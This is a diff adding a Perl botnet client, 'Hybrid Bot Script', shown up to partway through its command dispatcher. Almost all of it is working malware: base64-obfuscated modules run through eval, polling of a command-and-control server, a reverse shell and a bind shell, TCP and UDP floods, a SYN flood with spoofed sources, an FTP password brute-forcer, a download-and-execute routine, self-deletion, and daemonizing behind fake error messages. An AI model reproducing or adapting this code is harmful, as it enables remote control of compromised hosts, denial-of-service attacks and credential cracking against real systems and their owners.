@@ -1,0 +1,733 @@
+#!/usr/bin/perl
+######################################################
+# Hybrid Bot Script version 1.0
+# www.x1machine.com
+######################################################
+use Socket;
+#perl2exe_include Socket
+
+##################--[ settings ]--####################
+my $proto = getprotobyname('tcp');
+$SIG{CHLD} = 'IGNORE';
+$USER_AGENT = "Hybrid_v.1.0";	
+$FOLDER_NAME = "/web/";	
+$HELL_GATE = $FOLDER_NAME."getcmd.php";
+$HOME = "10.10.221.242";	
+$HOME_PORT = "80";		
+$DEFAULT_SLEEP_TIME = "10";	
+$AUTOSTART_FILE = "/etc/profile";
+$LOCAL_DIR = "/usr/local/bin/";	
+$BASE_NAME = "Hybrid";
+#################--[ setting ]--######################
+
+# decrypting routineS
+sub decry ($){ local($^W) = 0;my $str = shift;my $res = "";
+$str =~ tr|A-Za-z0-9+=/||cd;$str =~ s/=+$//;  $str =~ tr|A-Za-z0-9+/| -_|;  
+while ($str =~ /(.{1,60})/gs) {my $len = chr(32 + length($1)*3/4); 
+$res .= unpack("u", $len . $1 ); }$res;}
+
+# base64 perl implementation
+# Copyright 1995-1999, 2001-2004 Gisle Aas.
+sub encode_base64 ($;$){
+    if ($] >= 5.006) {
+	require bytes;
+	if (bytes::length($_[0]) > length($_[0]) ||
+	    ($] >= 5.008 && $_[0] =~ /[^\0-\xFF]/)){
+	    print("The Base64 encoding is only defined for bytes");
+		}
+    }
+    use integer;
+    my $eol = $_[1];
+    $eol = "\n" unless defined $eol;
+    my $res = pack("u", $_[0]);
+    $res =~ s/^.//mg;
+    $res =~ s/\n//g;
+    $res =~ tr|` -_|AA-Za-z0-9+/|;               # `# help emacs
+    my $padding = (3 - length($_[0]) % 3) % 3;
+    $res =~ s/.{$padding}$/'=' x $padding/e if $padding;
+    if (length $eol) {
+	$res =~ s/(.{1,76})/$1$eol/g;
+    }
+    return $res;
+}
+
+
+sub decode_base64 ($){
+    local($^W) = 0; # unpack("u",...) gives bogus warning in 5.00[123]
+    use integer;
+    my $str = shift;
+    $str =~ tr|A-Za-z0-9+=/||cd;            # remove non-base64 chars
+    if (length($str) % 4) {
+	print("Length of base64 data not a multiple of 4")
+    }
+    $str =~ s/=+$//;                        # remove padding
+    $str =~ tr|A-Za-z0-9+/| -_|;            # convert to uuencoded format
+    return "" unless length $str;
+    my $uustr = '';
+    my ($i, $l);
+    $l = length($str) - 60;
+    for ($i = 0; $i <= $l; $i += 60) {
+	$uustr .= "M" . substr($str, $i, 60);
+    }
+    $str = substr($str, $i);
+    if ($str ne "") {
+	$uustr .= chr(32 + length($str)*3/4) . $str;
+    }
+    return unpack ("u", $uustr);
+}
+
+########################################################
+#package Capture::_proxy;
+#use File::Temp 'tempfile';	# bot needs this package very much!
+#use Symbol qw/gensym qualify qualify_to_ref/;	# bot needs this package very much!
+my $cap = "cGFja2FnZSBDYXB0dXJlOjpfcHJveHk7CnVzZSBGaWxlOjpUZW1wICd0ZW1wZmlsZSc7CnVzZSBTeW1
+ib2wgcXcvZ2Vuc3ltIHF1YWxpZnkgcXVhbGlmeV90b19yZWYvOwpzdWIgX2lzX3dwZXJsIHsgJF5PIGVxICdNU1dpbjM
+yJyAmJiBiYXNlbmFtZSgkXlgpIGVxICd3cGVybC5leGUnIH0Kc3ViIG5ld0V4UHJveHkgeyBteSAkY2xhc3MgPSBzaGlmd
+DsKbXkgKCRvcmlnX2ZoLCAkY2FwdHVyZV92YXIsICRtZXJnZV9maCwgJGNhcHR1cmVfZmlsZSkgPSBAXzsKJG9yaW
+dfZmggPSBxdWFsaWZ5KCRvcmlnX2ZoKTsgIG15ICRmaHJlZiA9IHF1YWxpZnlfdG9fcmVmKCRvcmlnX2ZoKTsKbXkgJ
+HNhdmVkX2ZoO3sgbm8gc3RyaWN0ICdyZWZzJzsgaWYgKCBkZWZpbmVkIGZpbGVubygkb3JpZ19maCkgJiYgISBfaX
+Nfd3BlcmwoKSApIHsKJHNhdmVkX2ZoID0gZ2Vuc3ltOyBvcGVuICRzYXZlZF9maCwgIj4mJG9yaWdfZmgiOyB9fQpteS
+AoJG5ld2lvX2ZoLCAkbmV3aW9fZmlsZSk7aWYgKCAhICRtZXJnZV9maCApIHskbmV3aW9fZmggPSBnZW5zeW07Cmlm
+ICgkY2FwdHVyZV9maWxlKSB7ICRuZXdpb19maWxlID0gJGNhcHR1cmVfZmlsZTt9IGVsc2UgeyAodW5kZWYsICRuZXd
+pb19maWxlKSA9IHRlbXBmaWxlO30Kb3BlbiAkbmV3aW9fZmgsICIrPiRuZXdpb19maWxlIjt9IGVsc2UgeyAkbmV3aW9fZ
+mggPSBxdWFsaWZ5KCRtZXJnZV9maCk7fQp7IG5vIHN0cmljdCAncmVmcyc7ICBvcGVuICRmaHJlZiwgIj4mIi5maWxlbm8
+oJG5ld2lvX2ZoKTsgfQpibGVzcyBbJCQsICRvcmlnX2ZoLCAkc2F2ZWRfZmgsICRjYXB0dXJlX3ZhciwgJG5ld2lvX2ZoLCAkb
+mV3aW9fZmlsZSwgJGNhcHR1cmVfZmlsZV0sICRjbGFzczt9CnN1YiBERVNUUk9ZIHsgbXkgJHNlbGYgPSBzaGlmdDsKbX
+kgKCRwaWQsICRvcmlnX2ZoLCAkc2F2ZWRfZmgsICRjYXB0dXJlX3ZhciwgJG5ld2lvX2ZoLCAKJG5ld2lvX2ZpbGUsICRjYX
+B0dXJlX2ZpbGUpID0gQCRzZWxmOyByZXR1cm4gdW5sZXNzICRwaWQgZXEgJCQ7Cm15ICRmaF9yZWYgPSBTeW1ib2w
+6OnF1YWxpZnlfdG9fcmVmKCRvcmlnX2ZoKTsgc2VsZWN0KChzZWxlY3QgKCRmaF9yZWYpLCAkfD0xKVswXSk7CmlmICh
+kZWZpbmVkICRzYXZlZF9maCkgeyBvcGVuICRmaF9yZWYsICI+JiIuIGZpbGVubygkc2F2ZWRfZmgpO30gZWxzZSB7IGNsb
+3NlICRmaF9yZWY7fQppZiAocmVmICRjYXB0dXJlX3ZhciAmJiAkbmV3aW9fZmlsZSkge2xvY2FsICReVzsgICBzZWVrICRuZX
+dpb19maCwgMCwgMDsKJCRjYXB0dXJlX3ZhciA9IGRvIHtsb2NhbCAkLzsgPCRuZXdpb19maD59O31jbG9zZSAkbmV3aW9
+fZmggaWYgJG5ld2lvX2ZpbGU7CnJldHVybiB1bmxlc3MgZGVmaW5lZCAkbmV3aW9fZmlsZSAmJiAtZSAkbmV3aW9fZmlsZT
+sKcmV0dXJuIGlmICRjYXB0dXJlX2ZpbGU7IHVubGluayAkbmV3aW9fZmlsZTt9"; eval(decry($cap));
+#########################################################
+# this stuff is responsible for executing command by bot, anyways, i dont know for sure
+# if this functions are not included in perl latest distributions by default
+my $capEx = "JENhcnBMZXZlbCA9IDA7CnN1YiBfY2FwdHVyZSAoJkApIHsgbXkgKCRjb2RlLCAkb3V0cHV0LCAkZXJyb3IsICR
+vdXRwdXRfZmlsZSwgJGVycm9yX2ZpbGUpID0gQF87CnsgbG9jYWwgJENhcnA6OkNhcnBMZXZlbCA9IDE7IG15ICRlcnJvciA9I
+F92YWxpZGF0ZSgkb3V0cHV0LCAkZXJyb3IsICRvdXRwdXRfZmlsZSwgJGVycm9yX2ZpbGUpOwogICAgICBjcm9hayAkZXJyb3I
+gaWYgJGVycm9yO30KaWYgKCBkZWZpbmVkICRvdXRwdXQgfHwgZGVmaW5lZCAkZXJyb3IgKSB7IGZvciAoJG91dHB1dCwgJG
+Vycm9yKSB7CiRfID0gXGRvIHsgbXkgJHM7ICRzID0gJyd9IHVubGVzcyByZWYgJF87JCRfID0gJycgaWYgJF8gIT0gXHVuZGVmIC
+YmICFkZWZpbmVkKCQkXyk7fSB9Cm15ICRzaG91bGRfbWVyZ2UgPSAgKGRlZmluZWQgJGVycm9yICYmIGRlZmluZWQgJG91d
+HB1dCAmJiAkb3V0cHV0ID09ICRlcnJvcikgfHwgCiAgICAgICggIWRlZmluZWQgJG91dHB1dCAmJiAhZGVmaW5lZCAkZXJyb3IgK
+SB8fCAwOyAgbXkgKCRjYXB0dXJlX291dCwgJGNhcHR1cmVfZXJyKTsKaWYgKCAhZGVmaW5lZCAkb3V0cHV0IHx8ICRvdXRwd
+XQgIT0gXHVuZGVmICkgeyAKJGNhcHR1cmVfb3V0ID0gQ2FwdHVyZTo6X3Byb3h5LT5uZXdFeFByb3h5KCdTVERPVVQnLCAk
+b3V0cHV0LCB1bmRlZiwgJG91dHB1dF9maWxlICk7fQppZiAoICFkZWZpbmVkICRlcnJvciB8fCAkZXJyb3IgIT0gXHVuZGVmICkg
+eyAKbXkgJGNhcHR1cmVfZXJyID0gQ2FwdHVyZTo6X3Byb3h5LT5uZXdFeFByb3h5KCdTVERFUlInLCAkZXJyb3IsICgkc2hvdWx
+kX21lcmdlID8gJ1NURE9VVCcgOiB1bmRlZiksICRlcnJvcl9maWxlICk7fQogICAgJiRjb2RlKCk7fQoKc3ViIGNhcHR1cmUgKCZAKSB
+7ICByZXR1cm4gJl9jYXB0dXJlOyB9CnN1YiBjYXB0dXJlX2V4ZWMgeyBteSBAYXJncyA9IEBfOyBteSAoJG91dHB1dCwgJGVycm9y
+KTsKX2NhcHR1cmUgc3ViIHsgc3lzdGVtIF9zaGVsbF9xdW90ZShAYXJncykgfSwgXCRvdXRwdXQsIFwkZXJyb3I7CnJldHVybiB3Y
+W50YXJyYXkgPyAoJG91dHB1dCwgJGVycm9yKSA6ICRvdXRwdXQ7fSAqcXh4ID0gXCZjYXB0dXJlX2V4ZWM7Cipfc2hlbGxfcXVvd
+GUgPSAoJF5PID1+IC9NU1dpbjMyLykgPyBcJl9zaGVsbF9xdW90ZV93aW4zMiA6IHN1YiB7QF99OwpzdWIgX3NoZWxsX3F1b3Rl
+X3dpbjMyIHtteSBAYXJnczsgZm9yIChAXykge2lmICgvWyBcIl0vKSB7KG15ICRlc2NhcGVkID0gJF8pID1+IHMvKFtcIl0pL1xcJDEvZ
+zsKcHVzaCBAYXJncywgJyInIC4gJGVzY2FwZWQgLiAnIic7IG5leHQ7IH1wdXNoIEBhcmdzLCAkXyB9IHJldHVybiBAYXJnczt9CnN1
+YiBfdmFsaWRhdGUgeyBteSAoJG91dHB1dCwgJGVycm9yLCAkb3V0cHV0X2ZpbGUsICRlcnJvcl9maWxlKSA9IEBfOyBteSAkbXNn
+ID0gcXt9OwogICAgaWYgKCAgICBkZWZpbmVkICRvdXRwdXQgJiYgZGVmaW5lZCAkZXJyb3IgIAogICAgICAgICYmICBkZWZpbm
+VkICRvdXRwdXRfZmlsZSAmJiBkZWZpbmVkICRlcnJvcl9maWxlCiAgICAgICAgJiYgICRvdXRwdXQgPT0gJGVycm9yICYmICAkb3V0
+cHV0ICE9IFx1bmRlZgogICAgICAgICYmICAkb3V0cHV0X2ZpbGUgbmUgJGVycm9yX2ZpbGUKICAgICkgeyAkbXNnID0gIk1lcmdlZ
+CBTVERPVVQgYW5kIFNUREVSUiwgYnV0IHNwZWNpZmllZCBkaWZmZXJlbnQgb3V0cHV0IGFuZCBlcnJvciBmaWxlcyI7fQogICA
+gZWxzaWYgKCAhZGVmaW5lZCAkb3V0cHV0ICYmICFkZWZpbmVkICRlcnJvciAgCiAgICAgICAgJiYgIGRlZmluZWQgJG91dHB1dF9
+maWxlICYmIGRlZmluZWQgJGVycm9yX2ZpbGUKICAgICAgICAmJiAgJG91dHB1dF9maWxlIG5lICRlcnJvcl9maWxlCiAgICApIHsgJG1
+zZyA9ICJNZXJnZWQgU1RET1VUIGFuZCBTVERFUlIsIGJ1dCBzcGVjaWZpZWQgZGlmZmVyZW50IG91dHB1dCBhbmQgZXJyb3IgZ
+mlsZXMiO30KICAgIHJldHVybiAkbXNnO30="; eval(decry($capEx));
+########################################################
+# from package RC4, this is not used in this hybrid version
+my $RC = "JE1BWF9DSFVOS19TSVpFID0gMTAyNCB1bmxlc3MgJE1BWF9DSFVOS19TSVpFOwpzdWIgbmV3IHsgbXkgKC
+AkY2xhc3MsICRrZXkgKSAgPSBAXzsgbXkgJHNlbGYgPSBibGVzcyB7fSwgJGNsYXNzOwogICAgJHNlbGYtPntzdGF0ZX0gPS
+BTZXR1cCggJGtleSApOyRzZWxmLT57eH0gPSAwOyAkc2VsZi0+e3l9ID0gMDsgJHNlbGY7fQpzdWIgUkM0IHsgbXkgJHNlbG
+Y7IG15KCBAc3RhdGUsICR4LCAkeSApOyBpZiAoIHJlZiAkX1swXSApIHsgJHNlbGYgPSBzaGlmdDsKQHN0YXRlID0gQHsgJHNl
+bGYtPntzdGF0ZX0gfTskeCA9ICRzZWxmLT57eH07JHkgPSAkc2VsZi0+e3l9Owp9IGVsc2Uge0BzdGF0ZSA9IFNldHVwKCBza
+GlmdCApOyR4ID0gJHkgPSAwO31teSAkbWVzc2FnZSA9IHNoaWZ0O215ICRudW1fcGllY2VzID0gZG8gewpteSAkbnVtID0gb
+GVuZ3RoKCRtZXNzYWdlKSAvICRNQVhfQ0hVTktfU0laRTtteSAkaW50ID0gaW50ICRudW07JGludCA9PSAkbnVtID8gJGludC
+A6ICRpbnQrMTt9Owpmb3IgbXkgJHBpZWNlICggMC4uJG51bV9waWVjZXMgLSAxICkgewpteSBAbWVzc2FnZSA9IHVucGFj
+ayAiQyoiLCBzdWJzdHIoJG1lc3NhZ2UsICRwaWVjZSAqICRNQVhfQ0hVTktfU0laRSwgJE1BWF9DSFVOS19TSVpFKTsKZm9yI
+CggQG1lc3NhZ2UgKSB7ICR4ID0gMCBpZiArKyR4ID4gMjU1OyAkeSAtPSAyNTYgaWYgKCR5ICs9ICRzdGF0ZVskeF0pID4gMj
+U1OwpAc3RhdGVbJHgsICR5XSA9IEBzdGF0ZVskeSwgJHhdOyAkXyBePSAkc3RhdGVbKCAkc3RhdGVbJHhdICsgJHN0YXRlWy
+R5XSApICUgMjU2XTt9CnN1YnN0cigkbWVzc2FnZSwgJHBpZWNlICogJE1BWF9DSFVOS19TSVpFLCAkTUFYX0NIVU5LX1NJ
+WkUpID0gcGFjayAiQyoiLCBAbWVzc2FnZTsKfSBpZiAoJHNlbGYpIHsgJHNlbGYtPntzdGF0ZX0gPSBcQHN0YXRlOyAkc2VsZi0
++e3h9ID0gJHg7ICRzZWxmLT57eX0gPSAkeTt9JG1lc3NhZ2U7fQpzdWIgU2V0dXAge215IEBrID0gdW5wYWNrKCAnQyonLCB
+zaGlmdCApOyBteSBAc3RhdGUgPSAwLi4yNTU7bXkgJHkgPSAwOyBmb3IgbXkgJHggKDAuLjI1NSkgewokeSA9ICggJGtbJHgg
+JSBAa10gKyAkc3RhdGVbJHhdICsgJHkgKSAlIDI1NjsgQHN0YXRlWyR4LCAkeV0gPSBAc3RhdGVbJHksICR4XTt9CndhbnRhcnJ
+heSA/IEBzdGF0ZSA6IFxAc3RhdGU7fQ=="; eval(decry($RC));
+#  $encRC4 = RC4( $pass, $plain );  $decRC4 = RC4( $pass, $crypted );
+################# !!!!!!!!!! MODULES SECTION ENDS HERE !!!!!!!!!! ####################################
+
+sub min {
+   local($min)= $_[0]+0 ;  # force to numeric
+   foreach (@_) {
+       $min= $_ if $_<$min ;
+   }
+   return $min ;
+}
+
+###########################################################################
+sub newsocketto {
+   local(*S, $host, $port)= @_ ;
+   local($hostaddr, $remotehost) ;
+   ($hostaddr= ($host=~ /^(\d+)\.(\d+)\.(\d+)\.(\d+)$/) ?  pack('C4', $1, $2, $3, $4)
+                 :  (gethostbyname($host))[4] )  || return(0, "Couldn't find IP address for $host") ;
+   $remotehost= pack('S n a4 x8', AF_INET, $port, $hostaddr) ;
+   socket(S, AF_INET, SOCK_STREAM, (getprotobyname('tcp'))[2]) || return(0, "Couldn't create socket: $!") ;
+   connect(S, $remotehost)  || return(0, "Couldn't connect to $host:$port: $!") ;
+   select((select(S), $|=1)[0]) ;
+   return (1, "") ;
+}
+
+#############################################################################
+sub GetCommand {
+	my($host_ex, $port_ex, $hell_path, $user_agent) = @_;
+	my $return_buffer = "";
+($success, $errmsg)= &newsocketto(*S, $host_ex, $port_ex) ;
+   die $errmsg unless $success ;
+      print S "GET $hell_path HTTP/1.0\015\012",
+           "User-Agent: $user_agent\015\012\015\012" ;
+   vec($rin= '', fileno(S), 1)= 1 ;
+   select($rin, undef, undef, 60) || return "nores";
+   $numread= 0 ;
+   while ( ($numread<5) 
+           && ($thisread= read(S, $status_line, 5-$numread, $numread)) ) {
+       $numread+= $thisread ;
+   }
+   defined($thisread) || return "err";
+   if ($status_line!~ m#^HTTP/#) {
+ #      print $status_line ; #decode_base64
+  #     print while read(S, $_, 16384) ;
+   } else {
+       $status_line.= <S> ;
+       ($status_code)= ($status_line=~ m#^HTTP/\d+\.\d+\s+(\d+)#) ;
+
+       $headers= '' ;
+       while (<S>) {
+           last if /^\015?\012/ ;
+           $headers.= $_ ;
+       }
+       $headers=~ s/\015?\012[ \t]+/ /g ;
+       if ($status_code=~ /^(301|302|303)$/) {
+           unless ( ($URL)= ($headers=~ /^location:[ \t]*(\S*)/im) ) {
+               return "err";
+           }
+           ($numredirects++ > 5) && return "err";
+           print STDERR "Redirecting to $URL\n" ;
+           close(S) ;
+           redo GETURL ;
+       }
+
+       ($status_code == 200) || return $status_code;
+       if ( ($content_length)= ($headers=~ /^content-length:[ \t]*(\d*)/im) ) {
+           $lefttoget= $content_length ;
+           $lefttoget= $content_length ;
+           while ($lefttoget
+                   && ($thisread= read(S, $buf, &min($lefttoget,16384)) )) {
+               $return_buffer .= $buf;
+               $lefttoget-= $thisread ;
+           }
+           defined($thisread) || return "err";
+           $lefttoget && return "err";
+       } else {
+           print while read(S, $_, 16384) ;
+       }
+   }
+   close(S) ;
+   return $return_buffer;
+}
+###########################################################################
+sub RemShell { 
+my($host, $port) = @_;
+my $aaa=sockaddr_in($port, inet_aton($host));
+socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
+connect(S,$aaa);
+select S;
+$|=1; 
+while(defined(my $sss=<S>)){
+print qx($sss);
+	}
+close(S);
+}
+
+###########################################################################
+sub TrashStorm{
+my ($host, $port, $delay, $packets) = @_;
+my $x1 = my $x2 = my $x3 = 1; my $x10 = 0; my $x7 = getprotobyname("tcp"); 
+my $x11 = inet_aton($host); my $x12 = sockaddr_in($port, $x11);
+while($packets > 0) {
+	print "Attacking!!\n"; 
+my $x5 = 0; while($x5<$x1) { 
+my $x4 = "SOCK_$x5";
+socket($x4, PF_INET, SOCK_STREAM, $x7);
+connect($x4, $x12) || $x3--; $x5++;
+sleep $delay;} $x10++; my $x6 = 0; while($x6<$x2) { 
+$x9 = "SOCK_$x6" ; 
+shutdown($x9, 2);
+$x6++; }
+$packets--;
+	}
+}
+
+###########################################################################
+sub ftp_crack {
+	my ($target_host, $target_port, $pass_file) = @_;
+	my ($resp, $status) = "";
+	my $i = int(0); my $z = int(0);
+	my $last = int(0);
+	open (MYFILE, $pass_file);
+	while (<MYFILE>) {
+		chomp;
+		$line = "$_\n";
+		print $line."\n";
+		@tokens = split(/:/,$line);
+	$request_ex = "USER ".$tokens[0]."\r\n";
+	$request_porn = "PASS ".$tokens[1]."\r\n";
+	my $address = inet_aton($target_host);
+	my $paddr = sockaddr_in($target_port, $address);
+	$status = socket(SOCKET, PF_INET, SOCK_STREAM, (getprotobyname('tcp'))[2]);
+	if($status == int(-1)){
+		return "err";
+	}
+	$status = setsockopt(SOCKET, SOL_SOCKET, SO_REUSEADDR, 1);
+	if($status == undef){
+		return "err";
+	}
+	$status = connect(SOCKET, $paddr);
+	if($status != int(1)){
+		return "err";
+	}
+	$status = send(SOCKET, $request_ex, 0);
+	if($status == int(-1)){
+		return "err";
+	}
+	recv(SOCKET,$resp,1000,0);
+	print "1. recv: ".$resp." ".$request_ex."\n";
+		if($resp < int(1)){
+			int($i++);
+			print int($i)."\n";
+			if(int($i) > int(10)){
+				int($z++);
+				print "Server behaves like blocking us... :(\n";
+					if(int($z) > 10){
+						print "Should sleep longer...\n";
+						if($last = 1){
+							return "err";
+							} else {
+						sleep 60;
+						$last = 1;
+						redo;
+						}
+						} else {
+				sleep 10;
+				redo;
+				}
+				} else {
+			sleep 1;
+			redo;
+			}
+		} else {
+			@toks= split(/ /,$resp);
+			if($toks[0] eq "220"){
+				} elsif($toks[0] eq "530") {
+				next;
+				} else {
+					return "err";
+					}
+		}
+	
+	$status = send(SOCKET, $request_porn, 0);
+	if($status == -1){
+		return "err";
+	}
+	
+	recv(SOCKET,$resp,1000,0);
+	print "2. recv: ".$resp." ".$request_porn."\n";
+		if($resp < int(1)){
+			return "err";
+		} else {
+			@toks= split(/ /,$resp);
+			if($toks[0] eq "331"){
+				} elsif($toks[0] eq "530") {
+				next;
+				} elsif ($toks[0] eq "230") {
+					$status = "!".$target_host."!".$tokens[0]."!".$tokens[1];
+					return $status;	
+					} else {
+						return "err";
+						}
+		}
+		
+	$status = send(SOCKET, $request_porn, 0);
+	if($status == -1){
+		return "err";
+	}
+	
+	recv(SOCKET,$resp,1000,0);
+	print "3. recv: ".$resp." ".$request_porn."\n";
+		if($resp < 1){
+			return "err";
+		} else {
+			@toks= split(/ /,$resp);
+			if($toks[0] eq "530"){
+				next;
+				} elsif($toks[0] eq "230") {
+				$status = "!".$target_host."!".$tokens[0]."!".$tokens[1];
+				return $status;	
+				}
+		}
+	@toks= split(/ /,$resp);
+	if($toks[0] eq "230"){
+		$status = "!".$target_host."!".$tokens[0]."!".$tokens[1];
+		return $status;
+		}
+	}
+	$status = "!".$target_host."!no!lucK";
+	return $status;
+}
+##############################################################################
+# return: "inv_port"; "socket_err"; "setsockopt_err"; "bind_err"; "listen_err";
+sub CryShell {
+	my $out = "";
+    my $port = shift || 2345;
+    my $proto = getprotobyname('tcp');
+    ($port) = $port =~ /^(\d+)$/                        or return "inv_port";
+    socket(Server, PF_INET, SOCK_STREAM, $proto)	|| return "socket_err";
+    setsockopt(Server, SOL_SOCKET, SO_REUSEADDR,
+					pack("l", 1)) 	|| return "setsockopt_err";
+    bind(Server, sockaddr_in($port, INADDR_ANY))	|| return "bind_err";
+    listen(Server,SOMAXCONN) 				|| return "listen_err";
+    for ( ; $paddr = accept(Client,Server); close Client) {
+	recv (Client, $out, 99999, 0);
+	print $out."\n";
+	my($port,$iaddr) = sockaddr_in($paddr);
+	my $name = gethostbyaddr($iaddr,AF_INET);
+	my $decoded = decode_base64($out);
+	if($decoded eq "exit"){
+		last;
+		}
+	$shell = qxx($decoded);
+	$encoded = encode_base64($shell);
+	print Client $encoded."\n";
+    }
+}
+
+##############################################################################
+# SYN Storm, syn flooder with source ip spoofing
+sub SYNStorm {
+my ($target_ip, $target_p, $attack_delay, $send_packets) = @_;
+my $i;
+my $dest_host = inet_aton($target_ip);
+my $dest_port = $target_p;
+for($i=0; $i < $send_packets; ++$i) {
+my $source_port = rand(65534)+1;
+my $rand_source = join ".", map int rand 256, 1 .. 4;
+print $rand_source."\n";
+SynStorm($rand_source, $dest_host, $source_port, $dest_port);
+sleep($attack_delay);
+	}
+}
+
+sub SynStorm {
+my($src_host, $dst_host, $src_port, $dst_port) = @_;
+ socket(RAW, AF_INET, SOCK_RAW, 255) || die $!;
+ setsockopt(RAW, 0, 1, 1);
+ my $src_host = (gethostbyname($src_host))[4];
+ my ($packet) = makeheaders($src_host, $src_port, $dst_host, $dst_port);
+ my ($destination) = pack('Sna4x8', AF_INET, $dst_port, $dst_host);
+ send(RAW,$packet,0,$destination);
+}
+
+sub makeheaders {
+ local($src_host,$src_port,$dst_host,$dst_port) = @_;
+ my $zero_cksum = 0;
+ my $tcp_proto          = 6;
+ my ($tcp_len)          = 20;
+ my $syn                = rand(65534)+1;
+ my $ack                = 0;
+ my $tcp_headerlen      = "5";
+ my $tcp_reserved       = 0;
+ my $tcp_head_reserved  = $tcp_headerlen.$tcp_reserved;
+ my $tcp_urg            = 0; 
+ my $tcp_ack            = 0; 
+ my $tcp_psh            = 0; 
+ my $tcp_rst            = 0; 
+ my $tcp_syn            = 1; 
+ my $tcp_fin            = 0;
+ my $null               = 0;
+ my $tcp_win            = rand(65534)+1;
+ my $tcp_urg_ptr        = 0;
+ my $tcp_all            = $null.$null.$tcp_urg.$tcp_ack.$tcp_psh.$tcp_rst.$tcp_syn.$tcp_fin;
+ my ($tcp_pseudo) = pack('a4a4CCnnnNNH2B8nvn', $tcp_len,$src_port,$dst_port,$syn,$ack,
+  $tcp_head_reserved,$tcp_all,$tcp_win,$null,$tcp_urg_ptr);
+ my ($tcp_checksum) = &checksum($tcp_pseudo);
+ my $ip_ver             = 4;
+ my $ip_len             = 5;
+ my $ip_ver_len         = $ip_ver.$ip_len;
+ my $ip_tos             = 00;
+ my ($ip_tot_len)       = $tcp_len + 20;
+ my $ip_frag_id         = 19245;
+ my $ip_frag_flag       = "010";
+ my $ip_frag_oset       = "0000000000000";
+ my $ip_fl_fr           = $ip_frag_flag.$ip_frag_oset;
+ my $ip_ttl             = 30;
+ my ($pkt) = pack('H2H2nnB16C2na4a4nnNNH2B8nvn',
+  $ip_ver_len,$ip_tos,$ip_tot_len,$ip_frag_id,
+  $ip_fl_fr,$ip_ttl,$tcp_proto,$zero_cksum,$src_host,
+  $dst_host,$src_port,$dst_port,$syn,$ack,$tcp_head_reserved,
+  $tcp_all,$tcp_win,$tcp_checksum,$tcp_urg_ptr);
+ return $pkt;
+}
+
+sub checksum {
+ my ($msg) = @_;
+ my ($len_msg,$num_short,$short,$chk);
+ $len_msg = length($msg);
+ $num_short = $len_msg / 2;
+ $chk = 0;
+ foreach $short (unpack("S$num_short", $msg)) {
+  $chk += $short;
+ }
+ $chk += unpack("C", substr($msg, $len_msg - 1, 1)) if $len_msg % 2;
+ $chk = ($chk >> 16) + ($chk & 0xffff);
+ return(~(($chk >> 16) + $chk) & 0xffff);
+}
+
+##############################################################################
+# daemonizing function
+sub daemonize{
+    chdir '/'                 or die "Application Error! Are you root?\n"; # some fake messages if shit happenz
+    open STDIN, '/dev/null'   or die "Application Error! Are you root?\n";
+    open STDOUT, '>>/dev/null' or die "Application Error! Are you root?\n";
+    open STDERR, '>>/dev/null' or die "Application Error! Are you root?\n";
+    defined(my $pid = fork)   or die "Application Error! Are you root?\n";
+    exit if $pid;
+    setsid                    or die "Application Error! Are you root?\n";
+    umask 0;
+}
+##############################################################################
+# download and execute some file
+sub DownLoadExec {
+my ($remote_host, $remote_path, $local_path) = @_;
+my $bin = GetCommand($remote_host, "80", $remote_path, $USER_AGENT);
+open OUTF, ">$local_path" or return "accden";
+binmode OUTF;
+print OUTF $bin;
+close OUTF;	
+chmod 0777, $local_path;
+system("./".$local_path);
+return "STATUS_SUCCESS";
+}
+
+##############################################################################
+# generation of random string
+sub gen_rand
+{
+	my ($length_of_randomstring) = @_;;
+	my @chars=('a'..'z','A'..'Z','0'..'9','_', '0x00', '0x01');
+	my $random_string;
+	foreach (1..$length_of_randomstring) {
+		$random_string.=$chars[rand @chars];
+	}
+	return $random_string;
+}
+
+##############################################################################
+# udp flood
+sub udpflood{
+	my ($ip, $port, $time, $delay) = @_;
+    my ($iaddr,$endtime,$psize,$pport);
+    $iaddr = inet_aton("$ip");
+    $endtime = time() + ($time ? $time : 1000000);
+    socket(SOCKET, PF_INET, SOCK_DGRAM, 17);
+     my $stringa = gen_rand(65500);
+    for (;time() <= $endtime;){
+        $psize = int(rand(60500)) ;
+        $pport = $port ? $port : int(rand(65500))+1;
+    send(SOCKET, pack("a$psize",$stringa), 0, pack_sockaddr_in($pport, $iaddr));
+    print "Sent Packet: Size[$psize] Port[$pport]\n";
+    sleep($delay);
+    }
+    return 0;
+}
+
+################################################################################
+# generate random name for our bot
+sub GenBotName {
+my ($base_name) = @_; # base name, you submit it when generate new bot
+my $return_name = "";  # buffer for return
+my $login = getlogin() || getpwuid($<); # add login name to bot name
+my $sep = "_"; # separator
+my $rand_part = gen_rand(5); # random string
+$return_name = $base_name.$sep.$login.$sep.$rand_part;
+return $return_name;
+}
+################################################################################
+# send message function
+sub SendMyMessage{
+my ($message) = @_;	
+$botname = __FILE__;
+my $path = $HELL_GATE."?gcmd=1&name=".$botname."&msg=".$message."";
+return GetCommand($HOME, $HOME_PORT, $path, $USER_AGENT);
+}
+################################################################################
+
+sub MAIN {
+#my $botname = GenBotName("Hybrid");
+my $botname = __FILE__;
+my $selfdel = "selfdel";
+my $sleep = "sleep";
+my $ddos = "ddos";
+my $syn = "syn";
+my $udpstorm = "udpstorm";
+my $revsh = "revsh";
+my $remterm = "remterm";
+my $ftpcrack = "ftpcrack";
+my $dl_exec = "dl_exec";
+#print $botname."\n";
+my $MSG = "Online!";
+my $PATH = $HELL_GATE."?gcmd=1&name=".$botname."&msg=".$MSG."";
+my $command = GetCommand($HOME, $HOME_PORT, $PATH, $USER_AGENT);
+my $cmd = $command;
+print $cmd."\n";
+my @token = split(/!/, $cmd);
+#print $token[0]."\n";
+	if ($token[0] =~ /^$selfdel/){
+		SendMyMessage("Deleted");
+	unlink($0);
+	} elsif ($token[0] =~ /^$sleep/){
+	$time_sleep = $token[1];
+		SendMyMessage("Sleeping...");
+	sleep($time_sleep);
+	} elsif ($token[0] =~ /^$ddos/){ # TCP Storm
+		SendMyMessage("TCP+Storm!");
+	$target = $token[1]; $targ_port = $token[2];
+	$delay_time = $token[3]; $packets_count = $token[4];
+	TrashStorm($target, $targ_port, $delay_time, $packets_count);
+		SendMyMessage("Done!");
+	} elsif ($token[0] =~ /^$syn/){
+	$target = $token[1]; $targ_port = $token[2];
+	$delay_time = $token[3]; $packets_count = $token[4];
+	my $login = getlogin() || getpwuid($<);
+		if($login ne "root"){
+			SendMyMessage("No+Privileges!");
+		} else {
+			SendMyMessage("SYN+Storm!");
+			SYNStorm($target, $targ_port, $delay_time, $packets_count);
+			SendMyMessage("Done!");
+		}
